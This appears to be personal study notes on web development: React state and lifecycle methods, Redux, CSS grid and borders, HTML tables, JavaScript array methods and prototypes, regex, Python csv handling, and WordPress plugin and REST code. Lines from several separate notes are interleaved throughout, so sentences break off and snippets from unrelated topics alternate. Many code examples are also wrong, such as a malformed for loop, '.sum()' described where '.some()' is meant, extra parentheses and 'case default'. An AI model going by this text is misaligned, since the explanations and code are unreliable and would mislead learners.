  'Last weekend, I took literally the most beautiful bike ride of my life. The route is called "The 9W to Nyack" and it actually stretches all the way from Riverside Park in Manhattan to South Nyack, New Jersey. It\'s really an adventure from beginning to end! It is a 48 mile loop and it basically took me an entire day. I stopped at Riverbank State Park to take some extremely artsy photos. It was a short stop, though, because I had a really long way left to go. After a quick photo op at the very popular Little Red Lighthouse, I began my trek across the George Washington Bridge into New Jersey.  The GW is actually very long - 4,760 feet! I was already very tired by the time I got to the other side.  An hour later, I reached Greenbrook Nature Sanctuary, an extremely beautiful park along the coast of the Hudson.  Something that was very surprising to me was that near the end of the route you actually cross back into New York! At this point, you are very close to the end.';

These low fidelity elements serve as placeholders for high-fidelity design elements which include, but are not limited to logos, navigation search fields, text buttons, images and videos

        state is one of the most powerful features of components in React. it allows you to track important data in your app and render a ui in response to changes in this

  printf("%i , %i , %i , %i , %i",corretas1,corretas2,corretas3,corretas4,corretas5);
     if you do it in getStaticPaths, you must return an array as the value of the id like so

        There is another way to acess state in a component. in the render() method, before the return statement, you can write javasctipt directly. for example, you could
               return removedTail.data
instead of using em or px to size text, you can use viewport units for responsive typography. viewport units, like percentages are 
 you dont need to clarify the arguments that it has, example
        video.volume(numbetween 0 to 1);
                    backgroundColor: 'black',
               }

     {
            V F F F (V) V (V) (V) F (F)
      }
               })
            this deletes every row that the row_name is null
        declare functioons, acess data from state or props, perform computations on this data, and so on. then you can assign any data to variables, which you have acess to in the 
      relative units, but they are based off different items. viewport units are relative to the viewport dimensions (width or height)

    instead you should pass setState, a function that allows you to acess state and props. using a function with setState guarantees you are working with the most current values of state and props. this means
     
                  takes numbers as values. the higher the number, the more it will shrink compared to the other items in the container.
               center <- positions grid items on the center of the grid area
  const stats = {

to prevent the default value from causing problems on submission, uuse the function .preventDefault on your event

you can circumvent that by adding an cascade clause( on update cascade, on delete cascade) cause the updates or deletes to automatically be applied to any child tables
                  and it makes two areas in the middle row; advert and content. Note: every word in the code represents a cell and every

for example suppose wed like to set up the databse to automatically unregister attendees from a talk thats been cancelled. to do this we could apply on delete cascade to the foreign key constraint
    on the handlesubmit function would be like this 
    if(responseFromServer) {
            second_line = var_name.readline()

    we can convert that data into a dictionary using the csv library DictReader

    2. ~~b == ~(c -^n);
    a common pattern is to have stateful component containing the state important to the app, then that renders child components. you wnt these components to have acess to 
                  ]
  This can be achieved by using the then method. The then method is executed immediately after your promise is

     $mainQuery = new WP_Query([

                  this lets the grid know that you want the item 1 class to go in the area named header. in this case, the item will 
    some pieces of that state which are passed in as props. For example maybe you have an App component that renders a Navbar, among other components in your app, you have
  fulfilled with resolve. Here’s an example:

          'post_type' => [

                  the grid-area property you learned in the last challenge can be used in another way. if your grid doesnt have an

  // do something with the result.
                  areas template to reference, you can create an area on the fly for an item to be placed like this:
          's' => sanitize_text_field($reqData['term'])
            user_reader = csv.DictReader(users_csv)
     return (
    of your applications components, from the stateful parent components to child components. the child components only receive the state data they need. the second is 
                  item1 { grid-area: 1/1/2/4;}
});
            for row in user_reader:
     ]);
          <div>
    that complex stateful apps can be broken down into just a few or maybe a single stateful component. the rest of your components simply receive state from the parent as

    csv are usually comma separated files, however there are other ways for you to separate them, for you to separate them  you use the delimiter property on the DictReader

    or you can just see as a return to a function lulw
    // do something with the error
          'event' => [],
			</InspectorControls>
      when you used grid-template-columns and grid-template-rows to define the structure of a grid, you entered a value for each row 
  });
          'campus' => [],
    {
               ...rest
    when passing states you use this.props.name
      or column you created
if you want to search for something and returns true
        with open('filename', newline='') as file_var:
     ];
     )
            lets say you want a grid with 100 rows of the same height. it isnt very practical to insert 100 values individually. fortunatelly
  let petString = "James has a pet cat.";
            a_r = csv.DictReader(file_var, delimiter=';')
     while ($mainQuery->have_posts()) {
passing a callback as props
  let result = petRegex.test(petString);
            theres a better way - by using the repeat function to specify the number of times you want your column or row to be repeated, followed
            for row in a_r:
          $mainQuery->the_post();
altering the block menu config 
    you can pass satte as props to child components, but youre not limited to passing data. you can also pass handler functions or any method thats defined on a react component to a child component. 
            by a comma and the value want to repeat
  let petRegex = /dog|cat|bird|fish/; // Change this line
                print(row['Address'])
          $type = '';
     import { InspectorControls, BlockControls, AlignmentToolbar } from "@wordpress/block-editor"
                  heres an example that would create the 100 row grid, each row at 50px tall.
to make it non case sensitive, after the //, use i you want to make it non case sensitive
          switch (get_post_type()) {
    }           
     
                        grid-template-rows: repeat(100,50px)
    writing to a csv file 
    this is how you allow child components to interact with their parent components. you pass methods to a child just like a regular prop. its assigned a name and you have acess to that method name under this.props
               case 'teacher':
  /freecodecamp/i
     <BlockControls>
    in the child component
    {
with the .match() you can search for the thing and extract the word you want
                    $type = 'teacher';
     <AlignmentToolbar value={val} onChange={e => setVal(e)} />
                  you can also repeat multiple values with the repeat function and insert the function amongst other values when defining
to make it repeat, you can use /g ( use it if theres more than one case)
        import csv 
                    break;
     </BlockControls>
use the lifecycle Method componentWillMount
                  a grid structure
using the . charecter, you match everything that has the same charecter
        with open ('output.csv','w' as) output_csv:
               case "program":
    Reacts components have several special methods that provide opportunities to perform actions at specific points in the lifecycle of a component. these are called lifecycle method, or lifecycle hooksand allow 
                        grid-template-columns: repeat(2,1fr 50px ) 20px;
using [] is the same as putting an |
        fields = ['name','userid','is_admin']
                    $type = 'program';
add a preview 
    you to catch components at certain points in time. this cam be before they are rendered, before they update, before they receive props, before they unmount, and so on. here is a list of 
                  this translates to 
  /[aeiou]/gi;
        output_writer = csv.DictWriter(output_csv, fieldnames=fields)
                    break;
     in the wp.blocks.registerBlockType
    some of the main lifecycle methods: 
                        grid-template-columns: 1fr 50px 1fr 50px 20px;
using [minLetter-Maxletter] you can cycle all the letters without typing it out
        output_writer.writeheader();
               case "event":
          add prop example
    componentWillMount();
using [minNumber-maxNumber] you can cycle all the letters without typing it out
auto-fill allows you to automatically insert as many rows or columns of your desired size as possivle depending on the size of the container
        for item in someList:
                    $type = 'event';
               example: {
    componentDidMount();
you can create flexible layouts when combining auto-fill with minmax 
using ^ it excludes the things you put in the selection
            output_writer.writerow(item)
                    break;
    shouldComponentUpdate();
      repeat(auto-fill,minmax(69px, 1fr));
  /[^aeiou] = matches with everything that isnt a vowel
    }
                    question: "What is your question?",
    ComponentDidUpdate();
            when the container changes size, this setup keeps inserting 69px columns and stretching them until it can insert another one
using + and a charecter, it will only display the first thing that it catches

    the best practice with react is to place apicalls or any calls to your server in the lifecycle method componentDidMount() this method is called after a component is

you can use ? to find the closest match
            print(json_var)

     add a description prop

to set a timer, you first use the setTimeout notation, then you add what needs to be done after the timer finishes, then you add in miliseconds the time you want to wait.
     <input type="email">
  firstRegex.test(firstString);
        import json
               'permalink' => get_the_permalink()

    componentDidMount() {

    so far, if any component receives new state or new props, it re-renders itself and all its children. this is usually okay. but react provides a lifecycle method you can call when child

    }
          }
                    "show_in_rest" => true,
    components receive new state or props, and declare specifically if the components should update or not. the method is shouldComponentUpdate(), and it takes nextProps and 
     <strong></strong> <- makes text bold
          array_push($results[$type], [
    return result;
                    'type' => 'number',

     <em></em> <- italicizes text
this
               ...arr
                    'single' => false,
    this method is a useful way to optimize performance. for example the default behaviour is that your comonent re-renders when it receives new props, even if the props havent changed
     <video src="#" width="320" height="480" constrols> Video not supported</video>
          ]);
    function largestOfFour(arr) {
                    ]);
if you want to open a link on another tab
    let results = [];
     }
    you can use shouldComponentUpdate() to prevent this by comparing the props. the method must retirn a boolean value that tells react wheter or not to update the component. you can compare the 
     <a href="blank" target="_blank">Learn More</a>
    for (let i = 0; i < arr.length; i++) {
     if ($results['program']) {
handle component unmounting

     useEffect(() => {
introducing inline styles

    there are other complex concepts that add powerful capabilities to your react code. but you may be wondering about the more simple problem of how to style 
links
               array_push($programsMeta, [
        if (arr[i][j] > largestNumber) {
               updateMeta()
    to add styles you just add {{}} on the style part
     linking to relative Page
                    'key' => 'related_programs',
          largestNumber = arr[i][j];
          }
you can say an if statement another way, by using the {condition && return} 
        }
                    'compare' => "LIKE",
     })
    {this.state.display && <h1>Displayed!</h1>}

      }
                    'value' => '"' . $item['ID'] . '"'
and to query it in php
you can have a key element to each element on your array, when you go render that element, on the map function, add the key keyword
      results[i] = largestNumber;
               <a target="_blank" href="../../filename.html"> hyperlink</a>
               ]);
     $teacherQuery = new WP_Query([
    const renderedArray = array.map(item => <li key={item}>{item}</li>)

     link to the same page

  }
               [
        <ul>
          <a href="#id"><a>
 first you create a variable to store the largest number, then you have to go through all the arrays and sub arrays
          while ($programRelashionship->have_posts()) {
                    'key' => 'featuredTeacher',
        {rederedArray}
 you can create two loops for that: one for the main array and the other for the sub array
               $programRelashionship->the_post();
                    'compare' => '=',
        </ul>
HTML tables
 then you create a second variable largestnumber to store the arrays?
               if (get_post_type() == 'teacher') {
                    'value' => $id
        </div>
     to create a table 
                    array_push($results['teacher'], [
               ]
        )
          <table>
                         ...arr
 use SLICE TO COPY THE STRING 
          ]
    }
          </table>
  .slice(str)
                    ]);
     to create a row
               }
     ]);
there are to key reasons why rendering on the server may be used in a real world app. first without doing this, without doing this, without
          <table>
          }
your React apps would consist of a relatively empty html file and a large bundle of javascript when its initially loaded to the browser. this 
                <tr>
to return the last charecters of something 
          //to avoid duplicates
--------------------------------------------------------------------
may not be ideal for search engines that are tryung to index the content of your pages so people can find you. if you render the initial html
               </tr>
 str.slice(str.length - target.length) === target;
          $results['teacher'] = array_values(array_unique($results['teacher'], SORT_REGULAR));
storing the plugins data in the databse 
markyp on the server and this to the client, the initial page load contains all of the pages markyp which can be crawled bt search engines. second
          </table>
using a string variable += str;
     }
this creates a faster initial page load experience because the rendered html is smaller than the javascript code of the entire app . react will
     to add data
 will return str as many times as you want
     return $results;
          <table>
}
be able to recognize your app and manage it after the initial load
if you want to run code whenever you activate a plugin 
                <tr>
if you want to return something at a specific point on a string 
making the search page without js
     add_action('activate_new-pluginname/pluginFilename',[$this, 'funcname'])
REDUXX
  use str.slice to copy the string and (min index,max index);
                    <td></td>
     create file page-search.php
                    <td></td>
you can 
     make an form that redirects to /?s=term
create database table 
Redux is a state management framework that can be used with a number of different web technologies , including react
               </tr>
if you want to start at the last charecter in a for loop  
          <form method="GET" action="<?php echo esc_url(site_url('/')) ?>">
          </table>
  for (var i; i = str.length -1; i >= 0; i--)
in redux there is a single state object thats responsible for the entire state of your application. this means if you had a react app with
               <input name='s' type="search" />
     global $wpdb;
     table headings 
put everything in lowercase by using str.toLowerCase()
               <button type="submit">Submit</button>
     $tablename = $wpdb->prefix . 'pets';
10 components, and each component had its own local state, the entire state of your app would be defined by a single state object housed in 
         make a new tr  above or below the actual table
put everything in uppercase by using str.toUppercase()
          </form>
 require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
the redux store
          using the scope you can define if its a collumn or a row
array.filter the filter method takes an array as an input. takes each element in the array and it applies a conditional statement against it
    dbDelta("CREATE TABLE $tablename (
    const reducer = () => { return state};
               <table>
if this conditional returns true, the element gets pushed to the output array
managing roles 
      id bigint(20) unsigned not null AUTO_INCREMENT,
    const store = Redux.createStore(reducer)
                    <tr>
  var studentGrades = students.filter(function (student) {
          add ultimate planner roles  
      primary key  (id) //has to have 2 spaces :)
                         <th scope="col">name1</th>
you can get the stores current state from 
    //This tests if student.grade is greater than or equal to 90. It returns the "student" object if this conditional is met.
     create role 
    ) $wbdb->get_charset_collate();");
                         <th acope="col" >name2</th>                         
    const storeCurrentState = store.getState();
    return student.grade >= 90;
          go to post-type 
to make an action you
                    </tr>
  });
               register_post_type('event',[
insert in table 
    let action = {
                    'capability_type' => 'event',
                    <tr>
     global $wpdb;
.foreach  = does something to each item on the array
        type: 'LOGIN'
     $wpdb->insert($this->tablename, [
    }
                         <td>thing1</td>
  myArray.forEach(function(item,index)) {
                    'map_meta_cap' => true,
          "collumn" => value
    think of redux actions as messengers that deliver information about events happening in your app to the redux store. the store then conducts
                    </tr>
    console.log(item,index);  //returns 1 0  2 1   3 2  
               ])
     ]);
    the business of updating state based on the action that occured
                    
  }
               </table>
After creating an action, the next step is sending the action to the redux store so it can update its state. in redux, you define action
.map 
open registration
query table for data 
creators to accomplish this. an action creator create object that represent action events
spanning collumns
     configurations on admin wp site
     global $wbdb;
dispatch method is what you use to dispatch actions to the redux store. calling store.dispatch() and passing the value returned from an action 
          settings - general membership - anyone can register 
     what if the table contains data that spans multiple collumns
  takes the item of the array, does something to it and puts that thing on the same spot on the array
     $pets = $wpdb->get_results("query");
creator sends an action back to the store.
          example: a personal calendar could have events that span across multiple hours or days
  const three = [1,2,3];
          now users can register 
     colspan makes an item uses 2 collumns
  const doubled = three.map(function(item)) {
create registration page 
that can be unsafe so wp helps 
Recall that action creators return an object with a type property that specifies the action that has occured. then the method dispatches an action
     rowspan makes an item uses 2 rows
    return item * 2;
     check if user is signed in 
     $wpdb-prepare(query,param);
object to the Redux store. Based on the previous challenges example the following lines are equivalent, both dispatch the action of type LOGIN
          wp_is_user_logged_in()
  }                   // returns [2,4,6]
     query = select * from table where species = %s limit 10
    store.dispatch(actionCreator());
organizing the table
.filter 
     logout user 
     param = ['dog'];
    store.dispactch({type: 'LOGIN'});
     long tables can be sectioned off using the table body element <tbody>
  takes an array and checks each item on the array against a condition, if its true, its going to put the item 
          echo wp_logout_url()
After an action is created and dispatched, the Redux store needs to know how to respond to that action. This is the job of a reducer function. 
  back in the array, and if its not, its going to put it in another array
     the <tbody> element should contain all of the tables data excluding the table headings
     to lead to user page 
dynamic queries 
Reducers in Redux are responsible for the state modifications that take place in response to actions. A reducer takes state and action as arguments, 
     <thead> is the same as tbody
    const ints = [1,2,3];
          echo wp_login_url();
     getting from the url 
    const evens = ints.filter(function(item)) {
and it always returns a new state. It is important to see that this is the only role of the reducer. It has no side effects — it never calls an API 
          echo wp_registration_url()
endpoint and it never has any hidden surprises. The reducer is simply a pure function that takes state and action, then returns new state.
     <header> <- see what is on the top
      return item % 2 === 0;
     display users profile image           
          use the $_GET
     <nav> <- shows that its navigational links 
          echo get_avatar(get_current_user_id(),size);
    }     //returns     1 0   2 1   3 2    [2,4,6]   [2]
Another key principle in Redux is that state is read-only. In other words, the reducer function must always return a new copy of state and never modify 
to redirect users from the dashboard when the sign up/log on
     <main> <- the dominant content 
add to database and delete from the database 
state directly. Redux does not enforce state immutability, however, you are responsible for enforcing it in the code of your reducer functions. You'll 
     <footer> <- bottom of the content 
.reduce()  takes an array and do something and pass the result on the next iteration
     functions.php  
     https://www.udemy.com/course/become-a-wordpress-developer-php-javascript/learn/lecture/26880980#overview
practice this in later challenges.
     <section> <- defines elements in a document such as chapters, headings or any other area of the document 
  const sum = [1,2,3].reduce(function(result,item)) {
          add_action('admin_init',funcname);
     <article> <- holds content that makes sense on its own, ex articles, blogs, comments,magazines
    return result + item;
          function funcname() {
     
if you want to handle multiple actions with the same thing, use the action.type switch capabilities
  }, 0;                 // returns 6
               $currUser = wp_get_current_user();
    const authReducer = (state = defaultState, action) => {
.sum() check any item in the array meets the condition, returns true 
     <aside> <- mark additional information that can enhance another element but isnt required to understand the main content
               if (count($currUser->roles) == 1 && $currUser->roles[0] == 'subscriber') {
        switch(action.type) {
     <figure> <- is the same thing as an section but for images
  const hasNEgativeNumbers = [1,2,3,-1,4].some(function(item)) {
                    wp_redirect(site_url('/'))
            case 'LOGIN' :
     <figcaption> <-  captions the images and if the figure moves, the figcaption moves with it
    return item < 0;    // returns true because has at least one item that is less than one
                    exit;
            return {
  }
     <embed /> <- plays whatever media
               }
                auth: true
          }
            }
CSS
.every() = checks every item on the array and if every item on the array meets the condition, returns true
to not show admin bar to subscribers 
            case 'LOGOUT':
  const allPositiveNumbers = [1,2,3].every(function(item)) {
            return {
linking the css file on an html element
    return item > 0;
     function subscriberFunc()
                auth: false
     you can use the <link> element to link html and css files together, the <link> element must be placed within the head of the html file,
  }     // return true
     {
            }
     <link href="" rel=''>
.find() = checks every item on the array and checks if it has the correct id 
          $currentUser = wp_get_current_user();
        }
          rel <- describes the relashionship between the html file and the css file.
  const objects = [{id:"a"}, {id:"b"},{id:"c"}];
          if (count($currentUser->roles) == 1 && $currentUser->roles[0] == 'subscriber') {
    }
               examples 
  const found = objects.find function(item) {
               show_admin_bar(false);
                    stylesheet
a common practice when working with redux is to assign action types as read-only constants, then referrence these constants wherever they are used. you can refactor
    return item.id === "b";
          }
the code your`re working with to write the action types as consts declarations
if you want to select everything in a css tag
   }      // returns true
     }
    
     * {
.findIndex() = checks every item on the array and checks if it has the correct id 
     add_action("wp_loaded", 'subscriberFunc');
     }
  const objects = [{id:"a"}, {id:"b"},{id:"c"}];
another  method you have acess to on redux store object is store.subscribe(). this allow you to subscribe listener functions to the store, which are called whenever an action 
  const foundIndex = objects.findIndex(function(item)) {
on registration page theres a big wordpress logo that if you 
is dispatched against the store. one simple use for this method is to subscribe a function to your store that simply logs a message every time an action is received and the store is updated
to make the text uppercase on css
    return item.id === "b";
click it you are going to be redirect it to wordpress.com 
    each time that an action is registered on a createStore variable, if you use the store.subscribe(()=> function), that function will run
     .uppercase {
   }      // returns 1
to change it to your website 
          text-transform : uppercase
     in functions.php
when your app starts to grow more complex, it may be tempting to divide state into multiple pieces, but remember, all app state is held in a single state object in the store
     }
in this test
          function newLoginHeaderUrl() {
therefore, redux provides reducer composition as a solution for a complex state model. you define multiple reducers to handle different pieces of your application`s state, then
  function chunkArrayInGroups(arr, size) {
               return esc_url(site_url('/'));
compose these reducers together into one root reducer. the root reducer is then passed into the redux createStore() method 
   var newArr = [];
attributes 
          }
in order to let us combine multiple reducers together, redux provides with the combineReducers() method. this method accepts an object as an argument in which you define properties
    var i = 0;
     you can style based on any atribute
     the logo is not an image, its an css background image 
          img[src*='name'] {
    while (i < arr.length){
     if you want to change it 
which associate keys to specific reducer functions. the name you give to the keys will be used by redux as the name for the associated piece of state.
               border-color : black;
      newArr.push(arr.slice(i, i + size));
          in fucntions.php
    const rootReducer = Redux.combineReducers({count: counterReducer, auth:authReducer})
               border-width : 20px;
      i += size;
          function newLoginLogo()          {
          }
    }
               wp_enqueue_style('main', get_theme_file_uri('build/..file'));
if you want to do a function on the store.dispatch you first add the function, then the parameters, then you specify the type that you want it to be  and then what you want it to do
Specificity 
    return newArr;
          }
  }
          add_action('login_enqueue_scripts', 'newLoginLogo');
    const notesReducer = (state = 'initialState', action) => {
     is the order by which the browser decides which css styles will be displayed. A best practice in css is to style elements
  chunkArrayInGroups(["a", "b", "c", "d"], 2);
        switch(action.type) {
    in this test, yyou are suppose to cut the array on the specified size variable
     while using the lowest degree of specificity so that if an element neeeds a new style it is easy to override
in the login page the title says powered by wordpress 
            case 'ADD_NOTE':
chaining
to change that 
            return action.prop
     when you have elements inside elements, when you want to alter a bunch of elements inside another element you can just chain them togheter
    1 = you start by defining the variables newArr because in javascript you cant modify the array, so you create a new one 
     add_filter('login_headertitle','funcname');
            case default :
          header.div.h1 {
    2 = you create a while loop 
     function funcname() {
            return state
      while ( i < arr.length)
        }
          }
      this makes so the loop will onlyy be running for a certain amount of time 
          return get_bloginfo('name');
    }
descendand combinator 
    3 = on the next line you push the i and the size of the array, so you push the original numbers AND the rest of the numbers that make the size\
     }
     selecting elements that are nested withing other html elements,
    so i = 0; and the array is [0,1,2,3]; and the size is 2, so you take i = 0, plus the rest (the number of the rest is size)
    const addNoteText = (note) => {
          example 
      0 + 2 = 2 
user generated content 
        return {
      take 0,1,2
               <ul class='main-list'>
     register_post_type('note', [
            type: 'ADD_NOTE',
                <li></li>
    4 = you make the i = the size + the i that was before
          'show_in_rest' => true, //you cant work with it if its false
            text: note
                <li></li>
      so the i = 2 now
          'public' => false,
        }
                <li></li>
      and the new i in i + size = 4
          'show_ui' => true, //show in admin dashboard
    }
                <li></li>
              because i = 2 & size = 2
     ]);
    cost store = Redux.createStore(notesReducer);
               </ul>
to create an object, you create a variable + {}
          in the css would be 
    store.dispatch(addNoteText('hello!))
  let dog = {
$.ajax({
    name: 'buddy'
               .main-list li {
     url: url,
    numLegs: 2
     type: 'req_type',
to apply delays you pass it as an argument to Redux.applyMiddleware(). this statement is then provided as a second optional parameter ti the createStore(). then
               }
  };
     success: function,
text
to create a property, you just create a variable without using = but use :
     error: function,
there are ways to help enforce state immutability when state is an object. a useful tool for handling objects is the object.assign() takes a target object and source objects and maps properties
     style {
  name:'buddy'
}) // custom request
from the source objects to the target object. any matching properties are overwritten by properties in the sourece objects. this behaviour is commonly used to make shallow copies of objects by 
          font-family: font-name;
  numLegs: 2
passing an empty object as the first argument followed by the objects you want to copy
          font-size: sizepx;
you can create a function inside an object by using this syntax
if you are not logged in, you will not be able to delete/edit a post 
    const newObj = Object.assign({},obj1,obj2);
          font-weight: bold;
    this creates newObj as new obj which contains the properties of ob1 and obj2
     }
  sayNumber: function() {return 'is the number' + number + ' the number that you chose?'}
     in functions.php 
    to assign a new prop
     align {
using this. is a way for you to if you rename the obj, the variables will still be the same
          wp_localize_script('name','data',[
constructor is an object that its purpose its to create a lot of its kind (the properties are meant to be altered)
          text-align: right; <- aligns the text to the right of its parent 
        Object.assign({},objName,{key: value})
               'root_url' => get_site_url(),
  constructor have the first letter capitalized to diferentiate from functions 
               'nonce' => wp_create_nonce('wp_rest')
    they use the notation this. for everything
REACT + REDUXX
          text-align: left ; <- aligns the text to the left of its parent
          ])
          text-align: center; <- centers text inside of its parent element
    they use the ; after sentences
     will create a number that is on a session
          text-align: justify; <- spaces out text in order to align with the right and left side of the parent
    to create a new object from the constructor, use new objName = new constructorName;
     $.ajax({
     }     
  you can make so the constructor accepts variables so you can use the constructor just as a template and not as an object
			url: universityData.root_url + "wp-json/wp/v2/note/95",
     font weight {
    function Bird(name,color) {
			beforeSend: (xhr) => {
          bold <- bold font weight;
        this.name = name;
				xhr.setRequestHeader('X-WP-Nonce',universityData.nonce)
        this.color = color;
          normal <- normal font weight (the default value);
			}
          lighter <- one font weight lighter than the element parent value;
        this.numLegs = 2;
		})
          bolder <- one font weight bolder than the element parent value;
      }        
selecting the parent of an element
     }
  then you can alter the properties just by calling the constructor
     $(e.target).parent('selector')
     text transform {
    let samuel = new Bird(name, color);
     getting the id 
          uppercase;
    & to alter that property, just call for the variable name . the value you want to alter
     <li data-id="<?php echo get_the_ID ?>">
          lowercase;    
      samuel.name
     }
      samuel.color
     note.data('id')
     text layout {
          letter-spacing: 2px;
using instanceOf you can compare an object to an constructor, returning true or false based on wheter or not that object was created with the constructor
to make an input read only 
          word-spacing: 3px;
  let Bird = function(name, color) {
     <input readonly />
          line-height: 1.4;
    this.name = name;
    this.color = color;
          text-align: center;
whenever you are fetching a post from the server you need to add new data,
    this.numLegs = 2;
     }
you need to add some required data 
     @font-face
  }    
     data : {
          fonts can also be added using a @font-face ruleset in your css stylesheet instead of using a <link> element in your html document.
    Let crow = new Bird("alexis","Black") ;
          status: 'publish', //not be saved as draft 
               @font-face {
          //if you are adding content to a post type 
                    font-family: "my font"
          title: val,
    crow instanceOf Bird; // returns true;
          content: val,
                    src :  url('fonts/Roboto.woff2') format('woff2'),
     }
                           url('fonts/Roboto.woff') format('woff'),
  if an object is creaated without using a constructor, intanceof will verify that is not an instance of that constructor;
to add new post 
                           url('fonts/Roboto.ttf') format('truetype');
url /wp-json/wp/v2/${postType}/
               }

          margin <- the amount of space between the border and the outside edge of the element
        /// this would return false
          go to note post type 
     }
each instance of an object created by an constructor or something, has a property and when they are defined directly on the instance of the object
               register_post_type('note',[
               
(meaning that duck and canary have a different copyy of the same properties)
                    'capability_type' => "note",
     borders {
and you can see if an instance has properties and pass that property to an array
                    'map_meta_cap' => true,
          width <- the thicness of the border. can be set in pixels or with the keywords thin, medium , thick
  function name(property1) {

    this.property2 = 2;
          go to the subscriber role in the wp-admin

                    the radius of the dots is half the computed value of the same side`s border-width;
  let newName = name(2);
     publish_notes
               dashed <- display a series of short square-ended dashes or line segmanes. the exact size and length of the segments are not defined by the
     edit_notes
                    specification and are implementation specific
  let arrayName = [];
     delete_published_notes
               solid <- display one solid straight line
               double <- displays two straight lines that add up to the pixel size defined by border-width
  for (let varName in newName) {
however this will always show in the rest api
               groove <- siplays a border with a carved appearance. it is the opposite of ridge.
    if (newName.hasOwnProperty(varName)) {
to fix it 
               ridge <- displays a border with an extruded appearance
      arrayName.push(varName);      
     when you have the request to post something
               inset displays a border that makes the element appear embedded when appplied to a table cell with border-collapse set co collapsed, this value behaves like groove
    }
  }
               outset <- displays a border that makes the element appear embossed it is the opposite of inset. when applied to a table cell with
          var newPost = {
    first we start by defining the variables and creating the object 
                    title: $(".new-note-title").val(),
                    border-collapse set to collapsed, this value behaves like ridge
    second we stablish a loop that for every index of information (varName) this loop is going to happen
                    content: $(".new-note-body").val(),
     }
    third we use an if statement to see if the object has an property on the index that we called (varName);
                    status: "private",
     
    then we push the information on the index (varName) to the array (arrayName);
               }
     miniumum and maximum height and width
     in functions.php 
          min-width <- ensures a minimum width of an elements box

          controls what happens to content that spills or overflos, outside its box. the most commonly used values are
      dog.prototype.numLegs = 2;
                         $data['post_status'] = 'private';
               hidden <- when set to this value, any content that overflows will be hidden
                    }
               scroll <- a scrollbar will be added to the elements box so that the rest of the content can be viewd by scrolling
    }
                    return $data;
               visible <- when set to this value, the overflow content will be displayed outside of the containing element. note, this is the default value

you can alter the property of an object using the .prototype notation all at once 
          die('You have created too many posts');
                         left: 120px;
  for example

    instead of using
custom rest 
               
      bird.prototype.eat = function () {
when a user deletes a note, the rest sends back a count of how many slots they have left 
          absolute <- all other elements on the page will ignore the element and act as if the element is on the background
        console.log('nom nom noom');
     add_action('rest_api_init', 'uni_custom_rest');
    }
          fixed <- stays on the browsers screen no matter what 
     function uni_custom_rest()
               selector { 
      bird.prototype.describe = function() {

                    position: fixed;
        console.log('my name is ' + this.name);
     register_rest_field('note', 'user_note_count', [

          'get_callback' => function () {
                    left: 0px;
    you can add all of those togheter!
               return count_user_posts(get_current_user_id(), 'note');
      bird.prototype = {

        numLegs:2,
     ]);
        eat: function() {

          sticky <- is the better one if you are doing multiple of something because when you want the sticky the elements have their own positions
          console.log('nooom noooom nooooooooom')
          but the absolute they stack on each other
        }

          console.log('My name is ' + this.name);

     user can 'like' again but it removes one

there is one crucial side effect of manually setting the prototype to a new object. it erases the constructor property! this property can be used 
     getting all from likes from a specific teacher
to check wich constructon function created the instance, but since the property has been overwitten, it now gives false results 
          is used for wrapping text around an image while moving elements left and right for layout purposes is better left to tools like css grid and flexbox,          
      <?php $likeCount = new WP_Query([

    duck.constructor === object;

                                        'key' => 'teacher_id',
          if the element hits the side that its the side specified by the clear notation, it will move downwards
      it crashes because both of those things are true

               left <- the left side of the element will not touch any other element within the same containing element
to fix this, whenever a prototype is manually set to a new object, remember to define the constructor property
                                        'value' => get_the_ID(),
               right <- the right side of the element will not touch any other element within the same containing element

      if you want items to be in the same line and they are text you can use 
just like people inherit genes from their parents an object inherits its prototype from the constructor function that created it. 
                                   [
  example 
            display inline-block
                                        'key' => 'teacher_id',
    function Bird (name) {
                                        'compare' => '=',
if you want to center a div horizontally
                                        'value' => get_the_ID(),
      selector {
      this.name = name;
            margin: auto;
    }
                                   ]
      }
    let duck = new bird('donald');
                              ]
instead of adding marginElements or something like that, just add margins to the selector of the items 
duck inherits its prototype from the bird constructor function, you can show this relashionship with the notation isPrototypeOf(duck); // returns true
                         ]);
an objects prototype is itself an object and becasuse a prototype is an object, a prototype can have its own prototype, on this case the prototype of 
                         if ($exists->found_posts) {
when using linear gradient, the gradient is an image, so if you want to have an solid color first use the background prop
Bird.prototype is object.prototype
                              $existsVal =  'yes';
  object.prototype.isPrototypeOf(Bird.prototype);
  background: linear-gradient(90deg, rgb(255, 0, 0), rgb(0, 255, 0));
                         }
// just a note, freecodecamp made each parameter their own page, now thats handholding
how is this useful? you may recall the hasOwnProperty method
                         ?>
  let duck = new bird('donald');
programatically create and delete posts 
if you want to have color stops, you can add a % after the color
  duck.hasOwnProperty('name')
     function createPost ($data) {
the hasOwProperty method is defined in object.prototype, which can be accessed by Bird.prototype which can then be accessed by duck. this is an example of the prototype chain. in this prototype chain, 
          $teacher = $data['teacher_id'];
Bird is the supertype for duck. while duck is the subtype. object is a supertype for both bird and duck. Object is a supertype for all objects in javascript therefore, any object can use the hasOwnPropertyMethos

sometimes when elements have the height more than the parent element, they will disappear, its because the default display prop is block, and when two block elements are next to each other they stack up 
 funtion Dog(name) {
               'post_type' => "like",
to position two divs set their display to inline-block
               'post_status' => 'publish',
   this.name = name;
               'post_title' => 'title",
if you want to select the last of something in a type you can use the :last-of-type selector 
 }
               'post_content' => 'content',
 let beagle = new Dog('snoopy')
               'meta_input' => [
if you want to make inline inputs
 Dog.prototypeisprototypeOf(beagle)
                    'teacherid ' => $teacher
      <label>
 (object.prototype) ???.isprototypeOf(Dog.prototype)
               ]
            <input type='radio' name='somename' class='inline' /> this is the first name</label>
  the results is kinda like a food chain where the smaller one starts
          ]
            .inline {
  beagle => Dog => object
     }
                  width: unset;
lets say that you have a method called eating, and to not put the same method on every constructor, you can use a supertype and to define where this
     and you send the data with the prop data on the body or data if youre using ajax
            }
supertype goes, we can use a method called inheritance
    first you have to create a new instance of the object but without using the new Object method, instead lets use a new one
you can check users permissions in the php code itself 
    let animal = object.create(Animal.prototype); // this makes it easier when we are dealing with inheritance
if some elements are too high on the line, you can combat this by using the vertical align to middle 
     current_user_can('permission');
      vertical-align: middle 
  obj.create(obj) creates an objects and sets the new objects prototype
          remember to add a nonce code
  let duck = Object.create(Animal.prototype);
               beforeSend: (xhr) => {
attribute selection 
  let beagle = Object.create(Animal.prototype);
				xhr.setRequestHeader("X-WP-Nonce", universityData.nonce)
      instead of using the id you can use the selector 
  this creates an object called duck/beagle and sets as the animals prototype
			},
            input[name='password']
      you dont need to use name, you can use any data you want
